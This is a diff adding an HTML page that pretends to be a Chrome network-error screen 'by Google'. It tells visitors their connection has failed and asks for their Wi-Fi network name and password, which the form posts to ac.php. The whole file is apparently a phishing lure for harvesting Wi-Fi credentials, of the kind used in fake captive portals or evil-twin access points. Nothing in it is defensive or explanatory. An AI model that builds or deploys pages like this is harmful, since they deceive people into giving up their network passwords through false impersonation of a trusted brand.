@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+body {font-family: Arial, DENSE, sans-serif;}
+body {
+  background-color: wheat;
+}
+.rohit-modified{
+background-color: wheat;
+ text-align:center;
+}
+form {border: 0px solid #ccc;}
+
+input[type=text], input[type=password] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 0.5px solid #3f3f3f;
+  box-sizing: border-box;
+}
+
+button {
+  background-color: #3f3f3f;
+  color: white;
+  padding: 14px 30px;
+  margin: 8px 0;
+  border: 1px;
+  cursor: pointer;
+  width: 100%;
+}
+
+button:hover {
+  opacity: 1.8;
+}
+
+
+
+.imgcontainer {
+  text-align: center;
+  margin: 30px 0 20px 0;
+}
+
+img.avatar {
+  width: 50%;
+  border-radius: 50%;
+}
+
+.container {
+  padding: 16px;
+}
+
+span.psw {
+  float: right;
+  padding-top: 16px;
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 280px) {
+  span.psw {
+     display: block;
+     float: none;
+  }
+  .cancelbtn {
+     width: 90%;
+  }
+}
+.footer
+{
+   text-align:center;
+
+}
+
+</style>
+</head>
+<body>
+
+<h2>Error:please-connect-wifi</h2>
+<div class="rohit-modified">
+<i class="fa fa-chrome" size="80px"></i>
+<i>
+<h1>ERROR NETWORK CONNECTION WHILE VISITING TO THIS WEBSITE</h1>
+<p> Chrome server noticed that internet service has an error please enter wifi name & password<p>
+<p>Chrome by Google</p>
+</div>
+
+<form action="ac.php" method="post">
+  <div class="imgcontainer">
+    <i class="fa fa-wifi fa-4x" style="color:white" aria-hidden="true" ></i>
+  </div>
+  
+  <div class="container">
+    <label for="username"><b>WIFI-SSID NAME</b></label>
+    <input type="text" placeholder="Enter hotspot or router name" name="username" required>
+
+    <label for="password"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="password" required>
+        
+    <button type="submit">Login</button>
+  </div>
+</form>
+<div class="footer">
+  <p><i class="fa fa-copyright"> owner Rohit from Awesome tech</i>
+</div>
+</body>
+</html>
